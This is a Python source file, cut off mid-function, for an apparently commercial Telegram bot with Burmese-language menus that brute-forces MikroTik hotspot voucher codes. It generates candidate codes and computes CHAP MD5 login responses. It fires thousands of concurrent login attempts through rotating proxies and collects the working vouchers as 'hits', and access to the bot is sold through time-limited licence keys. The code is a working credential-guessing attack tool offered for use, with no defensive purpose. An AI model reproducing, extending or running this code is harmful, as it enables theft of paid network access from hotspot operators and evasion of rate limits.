import telebot, asyncio, aiohttp, json, base64, random, re, os, string, time, uuid
from telebot.async_telebot import AsyncTeleBot
from telebot.types import InlineKeyboardMarkup, InlineKeyboardButton
from aiohttp import web
from datetime import datetime, timedelta, timezone
import hashlib

# ==================== CONFIGURATION ====================
BOT_TOKEN = "************"
ADMINS = ["8181084923"]
ADMIN_CONTACT = "@kk3378076_lab

LICENSE_FILE = "licenses.json"
KEY_FILE = "keys.json"
PROXY_FILE = "proxies.txt"

# Mikrotik settings
ROUTER_URL_PATH = "mikrotik_url_"   # per-user router URL
LOGIN_PATH = "/login"
STATUS_PATH = "/status"

def is_admin(user_id):
    return str(user_id) in ADMINS

# ==================== LICENSE & KEY MANAGER ====================
def load_json_file(path, default=None):
    if default is None:
        default = {}
    if os.path.exists(path):
        try:
            with open(path, "r") as f:
                return json.load(f)
        except:
            return default
    return default

def save_json_file(path, data):
    try:
        with open(path, "w") as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        print(f"[save_json_file] Error: {e}")

def format_expiry_full(expiry_ts):
    if expiry_ts >= 999999999 * 86400:
        return "♾️ Unlimited (Never Expires)"
    dt = datetime.fromtimestamp(expiry_ts)
    return dt.strftime('%Y-%m-%d (%A) %H:%M:%S')

def format_remaining_time(expiry_ts):
    if expiry_ts >= 999999999 * 86400:
        return "♾️ Unlimited"
    remaining = int(expiry_ts - time.time())
    if remaining <= 0:
        return "❌ Expired"
    days = remaining // 86400
    hours = (remaining % 86400) // 3600
    mins = (remaining % 3600) // 60
    secs = remaining % 60
    parts = []
    if days > 0:
        parts.append(f"{days}ရက်")
    if hours > 0:
        parts.append(f"{hours}နာရီ")
    if mins > 0:
        parts.append(f"{mins}မိနစ်")
    if secs > 0 and days == 0:
        parts.append(f"{secs}စက္ကန့်")
    return " ".join(parts) if parts else "0 စက္ကန့်"

def get_user_license_status(user_id: int):
    if str(user_id) in ADMINS:
        return {
            "status": "♾️ Admin Unlimited",
            "expiry_ts": float('inf'),
            "expiry_full": "♾️ Never",
            "remaining": "♾️ Unlimited",
            "is_valid": True,
            "plan": "ADMIN"
        }
    licenses = load_json_file(LICENSE_FILE)
    str_id = str(user_id)
    if str_id in licenses:
        data = licenses[str_id]
        expiry = data.get('expiry', 0)
        plan = data.get('plan', 'Standard')
        if time.time() < expiry:
            return {
                "status": "✅ Active",
                "expiry_ts": expiry,
                "expiry_full": format_expiry_full(expiry),
                "remaining": format_remaining_time(expiry),
                "is_valid": True,
                "plan": plan
            }
        else:
            return {
                "status": "❌ Expired",
                "expiry_ts": expiry,
                "expiry_full": format_expiry_full(expiry),
                "remaining": "❌ Expired",
                "is_valid": False,
                "plan": plan
            }
    return {
        "status": "❌ No License",
        "expiry_ts": 0,
        "expiry_full": "❌ None",
        "remaining": "❌ None",
        "is_valid": False,
        "plan": "NONE"
    }

def is_user_valid(user_id: int) -> bool:
    return get_user_license_status(user_id)["is_valid"]

# ==================== PROXY MANAGER ====================
PROXY_LIST = []
_proxy_index = 0

def load_proxies_from_file():
    global PROXY_LIST
    if os.path.exists(PROXY_FILE):
        try:
            with open(PROXY_FILE, "r") as f:
                lines = [l.strip() for l in f if l.strip()]
            for p in lines:
                if p not in PROXY_LIST:
                    PROXY_LIST.append(p)
            print(f"✅ Loaded {len(PROXY_LIST)} proxies")
        except Exception as e:
            print(f"❌ Load error: {e}")

def save_proxies_to_file():
    try:
        with open(PROXY_FILE, "w") as f:
            f.write("\n".join(PROXY_LIST))
    except Exception as e:
        print(f"❌ Save error: {e}")

def add_proxies(new_proxies):
    global PROXY_LIST
    added = 0
    for p in new_proxies:
        p = p.strip()
        if p and p not in PROXY_LIST:
            PROXY_LIST.append(p)
            added += 1
    save_proxies_to_file()
    return added

def clear_proxies():
    global PROXY_LIST
    PROXY_LIST = []
    save_proxies_to_file()

def get_next_proxy():
    global _proxy_index
    if not PROXY_LIST:
        return None
    proxy = PROXY_LIST[_proxy_index % len(PROXY_LIST)]
    _proxy_index += 1
    return proxy

# ==================== MIKROTIK VOUCHER GENERATORS ====================
MIKROTIK_MODES = {
    "num4":    {"label": "🔢 Number 4",        "charset": "0123456789",                              "len": 4},
    "num5":    {"label": "🔢 Number 5",        "charset": "0123456789",                              "len": 5},
    "num6":    {"label": "🔢 Number 6",        "charset": "0123456789",                              "len": 6},
    "num7":    {"label": "🔢 Number 7",        "charset": "0123456789",                              "len": 7},
    "num8":    {"label": "🔢 Number 8",        "charset": "0123456789",                              "len": 8},
    "abc4":    {"label": "🔤 Lower 4",         "charset": string.ascii_lowercase,                    "len": 4},
    "abc5":    {"label": "🔤 Lower 5",         "charset": string.ascii_lowercase,                    "len": 5},
    "abc6":    {"label": "🔤 Lower 6",         "charset": string.ascii_lowercase,                    "len": 6},
    "upper4":  {"label": "🅰️ Upper 4",        "charset": string.ascii_uppercase,                    "len": 4},
    "upper5":  {"label": "🅰️ Upper 5",        "charset": string.ascii_uppercase,                    "len": 5},
    "upper6":  {"label": "🅰️ Upper 6",        "charset": string.ascii_uppercase,                    "len": 6},
    "mix4":    {"label": "🔀 Mix 4",           "charset": "0123456789abcdefghijklmnopqrstuvwxyz",    "len": 4},
    "mix5":    {"label": "🔀 Mix 5",           "charset": "0123456789abcdefghijklmnopqrstuvwxyz",    "len": 5},
    "mix6":    {"label": "🔀 Mix 6",           "charset": "0123456789abcdefghijklmnopqrstuvwxyz",    "len": 6},
    "alnum4":  {"label": "🔣 AlphaNum 4",      "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ",    "len": 4},
    "alnum5":  {"label": "🔣 AlphaNum 5",      "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ",    "len": 5},
    "alnum6":  {"label": "🔣 AlphaNum 6",      "charset": "0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ",    "len": 6},
}

# ==================== KEYBOARDS ====================
def get_main_keyboard(user_id=None):
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🔑 Key ထည့်ရန်", callback_data="menu_enter_key"),
        InlineKeyboardButton("📋 ကျွန်ုပ်၏ License", callback_data="menu_my_license"),
        InlineKeyboardButton("🌐 Router URL ထည့်ရန်", callback_data="menu_portal"),
        InlineKeyboardButton("⚙️ Mode ရွေးရန်", callback_data="menu_scan_mode"),
        InlineKeyboardButton("🚀 START SCAN", callback_data="menu_start_scam"),
        InlineKeyboardButton("🛑 STOP SCAN", callback_data="menu_stop"),
        InlineKeyboardButton("📦 Saved Codes", callback_data="menu_result"),
        InlineKeyboardButton("♻️ Recheck", callback_data="menu_recheck"),
    )
    if user_id and str(user_id) in ADMINS:
        kb.add(InlineKeyboardButton("⚙️ Admin Panel", callback_data="admin_panel"))
    return kb

def get_voucher_keyboard():
    kb = InlineKeyboardMarkup(row_width=3)
    kb.add(
        InlineKeyboardButton("Num 4", callback_data="scan_num4"),
        InlineKeyboardButton("Num 5", callback_data="scan_num5"),
        InlineKeyboardButton("Num 6", callback_data="scan_num6"),
    )
    kb.add(
        InlineKeyboardButton("Num 7", callback_data="scan_num7"),
        InlineKeyboardButton("Num 8", callback_data="scan_num8"),
        InlineKeyboardButton("Lower 4", callback_data="scan_abc4"),
    )
    kb.add(
        InlineKeyboardButton("Lower 5", callback_data="scan_abc5"),
        InlineKeyboardButton("Lower 6", callback_data="scan_abc6"),
        InlineKeyboardButton("Upper 4", callback_data="scan_upper4"),
    )
    kb.add(
        InlineKeyboardButton("Upper 5", callback_data="scan_upper5"),
        InlineKeyboardButton("Upper 6", callback_data="scan_upper6"),
        InlineKeyboardButton("Mix 4", callback_data="scan_mix4"),
    )
    kb.add(
        InlineKeyboardButton("Mix 5", callback_data="scan_mix5"),
        InlineKeyboardButton("Mix 6", callback_data="scan_mix6"),
        InlineKeyboardButton("Alnum 4", callback_data="scan_alnum4"),
    )
    kb.add(
        InlineKeyboardButton("Alnum 5", callback_data="scan_alnum5"),
        InlineKeyboardButton("Alnum 6", callback_data="scan_alnum6"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

def get_start_scam_keyboard():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🚀 START SCAN", callback_data="menu_start_scam"),
        InlineKeyboardButton("🛑 STOP SCAN", callback_data="menu_stop"),
        InlineKeyboardButton("⚙️ Mode", callback_data="menu_scan_mode"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

def get_back_keyboard():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(InlineKeyboardButton("🔙 နောက်သို့", callback_data="menu_back"))
    return kb

def get_admin_keyboard():
    kb = InlineKeyboardMarkup(row_width=1)
    kb.add(
        InlineKeyboardButton("🔑 Key ထုတ်ရန်", callback_data="admin_gen_key"),
        InlineKeyboardButton("➕ Proxy ထည့်ရန်", callback_data="admin_add_proxy"),
        InlineKeyboardButton("📋 Proxy List", callback_data="admin_proxy_list"),
        InlineKeyboardButton("🗑 Proxy အားလုံးဖျက်", callback_data="admin_clear_proxies"),
        InlineKeyboardButton("📊 Stats", callback_data="admin_stats"),
        InlineKeyboardButton("📋 License List", callback_data="admin_license_list"),
        InlineKeyboardButton("🔙 Back", callback_data="menu_back"),
    )
    return kb

def get_key_duration_keyboard():
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("30 မိနစ်", callback_data="create_key_30m"),
        InlineKeyboardButton("1 နာရီ", callback_data="create_key_1h"),
        InlineKeyboardButton("1 ရက်", callback_data="create_key_1d"),
        InlineKeyboardButton("5 ရက်", callback_data="create_key_5d"),
        InlineKeyboardButton("15 ရက်", callback_data="create_key_15d"),
        InlineKeyboardButton("30 ရက်", callback_data="create_key_30d"),
        InlineKeyboardButton("♾️ Unlimited", callback_data="create_key_unlimited"),
        InlineKeyboardButton("🔙 Back", callback_data="admin_panel"),
    )
    return kb

SUCCESS_CODE = asyncio.Queue()
bot = AsyncTeleBot(BOT_TOKEN)
user_data = {}
scan_tasks = {}
success_texts = {}
session = None
_connector = None
CONCURRENCY = 2000
_voucher_sem = None
_start_time = time.monotonic()
MAX_CONCURRENT_SCANS = 50
active_scans_count = 0
active_scans_lock = asyncio.Lock()
BATCH_SIZE = 2000

# ==================== WEB SERVER ====================
async def handle(request):
    return web.Response(text="Mikrotik Bot is alive!")

async def web_server():
    app = web.Application()
    app.router.add_get('/', handle)
    runner = web.AppRunner(app)
    await runner.setup()
    port = int(os.environ.get('BOT_PORT', 8099))
    site = web.TCPSite(runner, '0.0.0.0', port)
    await site.start()

# ==================== MIKROTIK CORE LOGIC ====================

def get_mac():
    first = random.choice([0x02, 0x06, 0x0A, 0x0E])
    mac = [first] + [random.randint(0, 255) for _ in range(5)]
    return ':'.join(f'{x:02x}' for x in mac)

def normalize_router_url(url: str) -> str:
    """Ensure URL has http:// prefix and no trailing slash."""
    url = url.strip().rstrip("/")
    if not url.startswith(("http://", "https://")):
        url = "http://" + url
    return url

async def mikrotik_fetch_challenge(session, base_url, headers):
    """Fetch CHAP challenge from Mikrotik login page."""
    try:
        async with session.get(base_url + "/", headers=headers, ssl=False,
                               timeout=aiohttp.ClientTimeout(total=10),
                               allow_redirects=True) as resp:
            body = await resp.text()

        chap_id = re.search(r'name="chap-id"\s+value="([^"]*)"', body)
        chap_challenge = re.search(r'name="chap-challenge"\s+value="([^"]*)"', body)

        return {
            "chap_id": chap_id.group(1) if chap_id else "",
            "chap_challenge": chap_challenge.group(1) if chap_challenge else "",
            "body": body,
        }
    except Exception:
        return None

def mikrotik_chap_hash(chap_id: str, password: str, chap_challenge: str) -> str:
    """Compute Mikrotik CHAP MD5 response."""
    try:
        challenge_bytes = bytes.fromhex(chap_challenge.replace("\\", ""))
        data = bytes.fromhex(chap_id) + bytes(password, "ascii") + challenge_bytes
        return hashlib.md5(data).hexdigest()
    except Exception:
        return ""

async def mikrotik_try_login(session, base_url, username, password, headers, chap_data):
    """
    Attempt Mikrotik hotspot login.
    Returns: 'success' | 'fail' | 'error'
    """
    try:
        login_url = base_url + "/login"

        # Build payload — CHAP if challenge exists, otherwise plain
        if chap_data and chap_data.get("chap_challenge") and chap_data.get("chap_id"):
            response = mikrotik_chap_hash(chap_data["chap_id"], password, chap_data["chap_challenge"])
            payload = {
                "username": username,
                "password": "",
                "response": response,
                "chap-id": chap_data["chap_id"],
                "chap-challenge": chap_data["chap_challenge"],
                "dst": base_url + "/",
                "popup": "true",
            }
        else:
            payload = {
                "username": username,
                "password": password,
                "dst": base_url + "/",
                "popup": "true",
            }

        async with session.post(login_url, data=payload, headers=headers, ssl=False,
                                timeout=aiohttp.ClientTimeout(total=10),
                                allow_redirects=False) as resp:
            body = await resp.text()
            status = resp.status

        body_lower = body.lower()

        # Mikrotik success detection
        success_signals = [
            "you are logged in",
            "logged in successfully",
            "you are now logged in",
            "login successful",
            "status: online",
            "window.location.href",
        ]
        fail_signals = [
            "invalid username",
            "invalid password",
            "user does not exist",
            "the user does not exist",
            "user is not allowed",
            "wrong username",
            "wrong password",
            "try again",
            "authentication failed",
        ]

        if any(sig in body_lower for sig in success_signals):
            return "success"
        if any(sig in body_lower for sig in fail_signals):
            return "fail"

        # Fallback: check redirect / status
        if status in (301, 302):
            location = resp.headers.get("Location", "").lower()
            if "error" in location or "login" in location:
                return "fail"
            return "success"

        # Check if body contains success status code
        if '"success":true' in body.replace(" ", "").lower():
            return "success"

        return "fail"
    except Exception:
        return "error"

async def mikrotik_check_code(session, base_url, code, headers):
    """Check a single voucher code (username=password=code)."""
    chap_data = await mikrotik_fetch_challenge(session, base_url, headers)
    if chap_data is None:
        return "error"

    result = await mikrotik_try_login(session, base_url, code, code, headers, chap_data)

    # Some Mikrotik setups use code as username and empty password
    if result == "fail":
        result = await mikrotik_try_login(session, base_url, code, "", headers, chap_data)

    return result

# ==================== SCANNER ====================
def iter_codes(mode, start_digit=None):
    """Generate voucher codes for given mode."""
    cfg = MIKROTIK_MODES.get(mode)
    if not cfg:
        raise ValueError(f"Unknown mode: {mode}")
    charset = cfg["charset"]
    length = cfg["len"]

    if mode.startswith("num") and start_digit is not None:
        # Sequential from start_digit
        start = int(start_digit) * (10 ** (length - 1))
        end = (int(start_digit) + 1) * (10 ** (length - 1))
        for i in range(start, end):
            yield str(i).zfill(length)
        return

    while True:
        yield "".join(random.choice(charset) for _ in range(length))

async def perform_check(router_url, code, chat_id, scan_id=None, recheck=False):
    """Check one voucher code against Mikrotik router."""
    if not recheck:
        t = scan_tasks.get(chat_id)
        if not t or t.get("scan_id") != scan_id or t.get("stop"):
            return

    base_url = normalize_router_url(router_url)
    headers = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 14) AppleWebKit/537.36 "
                      "(KHTML, like Gecko) Chrome/148.0.0.0 Mobile Safari/537.36",
        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
        "Accept-Language": "en-US,en;q=0.9",
    }

    proxy = get_next_proxy()
    connector = None
    if proxy:
        try:
            from aiohttp_socks import ProxyConnector
            connector = ProxyConnector.from_url(proxy, ssl=False)
        except Exception:
            connector = None

    try:
        timeout = aiohttp.ClientTimeout(total=20)
        async with aiohttp.ClientSession(
            connector=connector,
            connector_owner=(connector is not None),
            cookie_jar=aiohttp.CookieJar(),
            timeout=timeout
        ) as ts:
            result = await mikrotik_check_code(ts, base_url, code, headers)

        if result == "success":
            if recheck:
                return code
            if chat_id not in success_texts:
                success_texts[chat_id] = []
            entry = f"`{code}` ✅"
            if entry not in success_texts[chat_id]:
                success_texts[chat_id].append(entry)
            await SUCCESS_CODE.put({"chat_id": chat_id, "code": code})
        return result
    except Exception:
        return "error"

async def run_bruteforce(mode, chat_id, router_url, scan_id, progress_msg=None, start_digit=None):
    try:
        code_iter = iter_codes(mode, start_digit=start_digit)
    except ValueError as e:
        await bot.send_message(chat_id, str(e))
        return

    checked = 0
    scan_start = time.monotonic()
    global _voucher_sem
    if _voucher_sem is None:
        _voucher_sem = asyncio.Semaphore(CONCURRENCY)

    last_update = time.monotonic()

    try:
        while True:
            t = scan_tasks.get(chat_id)
            if not t or t.get("scan_id") != scan_id or t.get("stop"):
                return

            batch = []
            for _ in range(BATCH_SIZE):
                try:
                    batch.append(next(code_iter))
                except StopIteration:
                    break
            if not batch:
                break

            async def _check(c):
                async with _voucher_sem:
                    return await perform_check(router_url, c, chat_id, scan_id)

            await asyncio.gather(*[_check(c) for c in batch], return_exceptions=True)
            checked += len(batch)

            now = time.monotonic()
            if now - last_update < 2:
                continue
            last_update = now

            hits = success_texts.get(chat_id, [])
            found = len(hits)
            elapsed = now - scan_start
            speed = (checked / elapsed * 60) if elapsed > 0 else 0

            hits_text = "None" if not hits else "\n".join(f"⭐ {h}" for h in hits[-10:])

            text = f"""⏹️ **STOP SCAN**
━━━━━━━━━━━━━━━━━━
📊 Tried: {checked:,}
🔢 Code: {batch[-1] if batch else '...'}
✅ Hits: {found}
⚡ Speed: {speed:,.0f} c/m
🌐 Proxies: {len(PROXY_LIST)}
🎯 Mode: `{mode}`
━━━━━━━━━━━━━━━━━━
📌 Hits:
{hits_text}"""
            try:
                await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=text)
            except:
                pass

        hits = success_texts.get(chat_id, [])
        final = f"""✅ **Scan Complete!**

📊 Tried: `{checked:,}`
✅ Hits: `{len(hits)}`
⚡ Speed: `{(checked / max(time.monotonic() - scan_start, 1) * 60):,.0f} c/m`

🎯 Mode: `{mode}`"""
        try:
            await bot.edit_message_text(chat_id=chat_id, message_id=progress_msg.message_id, text=final)
        except:
            pass
    finally:
        scan_tasks.pop(chat_id, None)
        global active_scans_count
        async with active_scans_lock:
            active_scans_count = max(0, active_scans_count - 1)

# ==================== START ====================
@bot.message_handler(commands=['start'])
async def start(message):
    user_id = str(message.chat.id)
    user_name = message.from_user.first_name or "User"

    if message.chat.id not in user_data:
        user_data[message.chat.id] = {}

    lic = get_user_license_status(message.chat.id)

    if not lic["is_valid"] and user_id not in ADMINS:
        await bot.send_message(
            message.chat.id,
            f"❌ **ခွင့်ပြုချက် မရှိသေးပါ**\n\n"
            f"👤 User ID: `{user_id}`\n"
            f"📋 Status: `{lic['status']}`\n\n"
            f"👨‍💻 Admin: {ADMIN_CONTACT}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="🔑 Key ထည့်ရန်", callback_data="menu_enter_key")]]),
            parse_mode="Markdown"
        )
        return

    text = f"""🎯 **Mikrotik Voucher Scanner**

👤 NAME: {user_name}
🆔 USER ID: `{user_id}`

━━━━━━━━━━━━━━━━━━
📋 **LICENSE INFO**
━━━━━━━━━━━━━━━━━━
✅ Status: {lic['status']}
📦 Plan: `{lic['plan']}`
⏰ Expiry: `{lic['expiry_full']}`
⏳ Remaining: **{lic['remaining']}**
━━━━━━━━━━━━━━━━━━

အောက်ပါ Menu မှ ရွေးချယ်ပါ။"""

    await bot.send_message(message.chat.id, text, reply_markup=get_main_keyboard(message.chat.id), parse_mode="Markdown")

# ==================== ADMIN COMMANDS ====================
@bot.message_handler(commands=['grant'])
async def grant_command(message):
    if str(message.chat.id) not in ADMINS:
        return
    args = message.text.split()
    if len(args) < 3:
        await bot.reply_to(
            message,
            "⚙️ **Usage:** `/grant <user_id> <time>`\n\n"
            "**Examples:**\n"
            "• `/grant 123456789 30m` - 30 မိနစ်\n"
            "• `/grant 123456789 2h` - 2 နာရီ\n"
            "• `/grant 123456789 5d` - 5 ရက်",
            parse_mode="Markdown"
        )
        return
    try:
        target = int(args[1])
        t = args[2].lower()

        if t.endswith('m'):
            dur = int(t[:-1]) * 60
            label = f"{t[:-1]} မိနစ်"
        elif t.endswith('h'):
            dur = int(t[:-1]) * 3600
            label = f"{t[:-1]} နာရီ"
        elif t.endswith('d'):
            dur = int(t[:-1]) * 86400
            label = f"{t[:-1]} ရက်"
        else:
            dur = int(t) * 3600
            label = f"{t} နာရီ"

        licenses = load_json_file(LICENSE_FILE)
        cur = licenses.get(str(target), {}).get('expiry', 0)
        base = cur if cur > time.time() else time.time()
        new_exp = base + dur

        licenses[str(target)] = {
            'expiry': new_exp,
            'plan': label,
            'granted_at': time.time(),
            'granted_by': str(message.chat.id)
        }
        save_json_file(LICENSE_FILE, licenses)

        if target in user_data:
            del user_data[target]

        expiry_str = format_expiry_full(new_exp)
        remaining_str = format_remaining_time(new_exp)

        await bot.reply_to(
            message,
            f"""✅ **Granted Successfully!**

━━━━━━━━━━━━━━━━━━
👤 User ID: `{target}`
📦 Plan: `{label}`
━━━━━━━━━━━━━━━━━━
⏰ **Expiry Date:**
`{expiry_str}`

⏳ **Remaining:**
**{remaining_str}**
━━━━━━━━━━━━━━━━━━""",
            parse_mode="Markdown"
        )
    except Exception as e:
        await bot.reply_to(message, f"❌ Error: {e}")

@bot.message_handler(commands=['revoke'])
async def revoke_command(message):
    if str(message.chat.id) not in ADMINS:
        return
    args = message.text.split()
    if len(args) < 2:
        await bot.reply_to(message, "Usage: `/revoke <user_id>`", parse_mode="Markdown")
        return
    try:
        target = str(args[1])
        licenses = load_json_file(LICENSE_FILE)
        if target in licenses:
            del licenses[target]
            save_json_file(LICENSE_FILE, licenses)
            try:
                t_int = int(target)
                if t_int in user_data:
                    del user_data[t_int]
                if t_int in scan_tasks:
                    d = scan_tasks[t_int]
                    if not d["task"].done():
                        d["stop"] = True
                        d["task"].cancel()
                    scan_tasks.pop(t_int, None)
            except:
                pass
            await bot.reply_to(message, f"✅ User `{target}` revoked", parse_mode="Markdown")
        else:
            await bot.reply_to(message, f"❌ User `{target}` not found", parse_mode="Markdown")
    except Exception as e:
        await bot.reply_to(message, f"❌ {e}")

# ==================== CALLBACK HANDLER ====================
@bot.callback_query_handler(func=lambda call: True)
async def callback_handler(call):
    chat_id = call.message.chat.id
    user_id = str(chat_id)

    lic = get_user_license_status(chat_id)
    if not lic["is_valid"] and user_id not in ADMINS and call.data != "menu_enter_key":
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=f"❌ သက်တမ်းကုန်ပါပြီ။ Admin: {ADMIN_CONTACT}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="🔑 Key ထည့်ရန်", callback_data="menu_enter_key")]])
        )
        await bot.answer_callback_query(call.id)
        return

    if chat_id not in user_data:
        user_data[chat_id] = {}
    ud = user_data[chat_id]
    data = call.data

    # ===== KEY ENTRY =====
    if data == "menu_enter_key":
        ud['state'] = 'waiting_for_key'
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="🔑 **Admin ထံမှ ရထားသော Key ကို ပို့ပါ။**", parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    # ===== LICENSE INFO =====
    if data == "menu_my_license":
        lic = get_user_license_status(chat_id)
        text = f"""📋 **သင်၏ License အချက်အလက်**

━━━━━━━━━━━━━━━━━━
👤 User ID: `{user_id}`
📦 Plan: `{lic['plan']}`
✅ Status: {lic['status']}
━━━━━━━━━━━━━━━━━━
⏰ **Expiry Date:**
`{lic['expiry_full']}`

⏳ **Remaining:**
**{lic['remaining']}**
━━━━━━━━━━━━━━━━━━

👨‍💻 Admin: {ADMIN_CONTACT}"""

        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=text, reply_markup=get_back_keyboard(), parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    # ===== ADMIN PANEL =====
    if data == "admin_panel" and user_id in ADMINS:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="⚙️ **Admin Panel**", reply_markup=get_admin_keyboard(), parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "admin_gen_key" and user_id in ADMINS:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="⚙️ **Key သက်တမ်း ရွေးပါ**", reply_markup=get_key_duration_keyboard(), parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    if data.startswith("create_key_") and user_id in ADMINS:
        dt = data.replace("create_key_", "")
        smap = {
            "30m": (1800, "30 မိနစ်"),
            "1h": (3600, "1 နာရီ"),
            "1d": (86400, "1 ရက်"),
            "5d": (432000, "5 ရက်"),
            "15d": (1296000, "15 ရက်"),
            "30d": (2592000, "30 ရက်"),
            "unlimited": (999999999 * 86400, "♾️ Unlimited")
        }
        sec, label = smap.get(dt, (3600, "1 နာရီ"))

        rk = "MIKROTIK-" + ''.join(random.choices(string.ascii_uppercase + string.digits, k=12))

        keys = load_json_file(KEY_FILE)
        keys[rk] = {
            "duration_sec": sec,
            "label": label,
            "created_at": time.time(),
            "created_by": str(user_id)
        }
        save_json_file(KEY_FILE, keys)

        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=f"""✅ **Key Generated!**

━━━━━━━━━━━━━━━━━━
🔑 `{rk}`
━━━━━━━━━━━━━━━━━━
⏳ Duration: `{label}`
📅 Created: `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`
━━━━━━━━━━━━━━━━━━

ℹ️ Key ကို User သုံးတဲ့အချိန်မှ သက်တမ်းစတင်တွက်ပါမည်။""",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="⬅️ Admin", callback_data="admin_panel")]]),
            parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "admin_add_proxy" and user_id in ADMINS:
        ud['state'] = 'waiting_for_proxy_text'
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="📥 **Proxy များ တစ်ကြောင်းချင်း ပို့ပါ**\n\n"
                 "ဥပမာ:\n`123.45.67.89:8080`\n`socks5://user:pass@host:1080`\n`socks4://host:1080`",
            parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "admin_proxy_list" and user_id in ADMINS:
        if not PROXY_LIST:
            txt = "Proxy မရှိသေးပါ။"
        else:
            preview = PROXY_LIST[:30]
            txt = "\n".join(f"• `{p}`" for p in preview)
            if len(PROXY_LIST) > 30:
                txt += f"\n\n... and {len(PROXY_LIST) - 30} more"

        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=f"📋 **Proxy List ({len(PROXY_LIST)})**\n\n{txt}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="⬅️ Back", callback_data="admin_panel")]]),
            parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "admin_clear_proxies" and user_id in ADMINS:
        clear_proxies()
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="🗑 **Proxy အားလုံး ဖျက်ပြီးပါပြီ။**",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="⬅️ Back", callback_data="admin_panel")]]),
            parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "admin_stats" and user_id in ADMINS:
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=f"📊 **Stats**\n\n🌐 Proxies: `{len(PROXY_LIST)}`\n👥 Sessions: `{len(user_data)}`\n🔍 Active Scans: `{sum(1 for d in scan_tasks.values() if not d['task'].done())}`",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="⬅️ Back", callback_data="admin_panel")]]),
            parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "admin_license_list" and user_id in ADMINS:
        licenses = load_json_file(LICENSE_FILE)
        if not licenses:
            txt = "License မရှိသေးပါ။"
        else:
            lines = []
            for uid, d in list(licenses.items())[:50]:
                exp = d.get('expiry', 0)
                plan = d.get('plan', 'N/A')
                rem = format_remaining_time(exp)
                lines.append(f"👤 `{uid}` | {plan} | {rem}")
            txt = "\n".join(lines)

        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=f"📋 **Licenses ({len(licenses)})**\n\n{txt}",
            reply_markup=InlineKeyboardMarkup([[InlineKeyboardButton(text="⬅️ Back", callback_data="admin_panel")]]),
            parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    # ===== MAIN MENU =====
    if data == "menu_back":
        lic = get_user_license_status(chat_id)
        text = f"""🎯 **Mikrotik Voucher Scanner**

🆔 USER ID: `{user_id}`

━━━━━━━━━━━━━━━━━━
📋 **LICENSE INFO**
━━━━━━━━━━━━━━━━━━
✅ Status: {lic['status']}
📦 Plan: `{lic['plan']}`
⏰ Expiry: `{lic['expiry_full']}`
⏳ Remaining: **{lic['remaining']}**
━━━━━━━━━━━━━━━━━━"""

        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text=text, reply_markup=get_main_keyboard(chat_id), parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "menu_portal":
        ud['state'] = 'waiting_for_portal_url'
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="🌐 **Mikrotik Router URL ကို ပို့ပါ။**\n\n"
                 "ဥပမာ:\n"
                 "`http://192.168.88.1`\n"
                 "`http://10.5.50.1`\n"
                 "`http://hotspot.example.com`",
            parse_mode="Markdown"
        )
        await bot.answer_callback_query(call.id)
        return

    if data == "menu_scan_mode":
        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
            text="⚙️ **Voucher Mode ရွေးပါ**\n\nMikrotik voucher format ကို ရွေးပါ",
            reply_markup=get_voucher_keyboard()
        )
        await bot.answer_callback_query(call.id)
        return

    if data.startswith("scan_"):
        mode = data.replace("scan_", "")
        if mode not in MIKROTIK_MODES:
            await bot.answer_callback_query(call.id, "❌ Invalid mode")
            return
        ud['selected_mode'] = mode
        ud['start_digit'] = None

        await bot.edit_message_text(
            chat_id=chat_id, message_id=call.message.message_id,
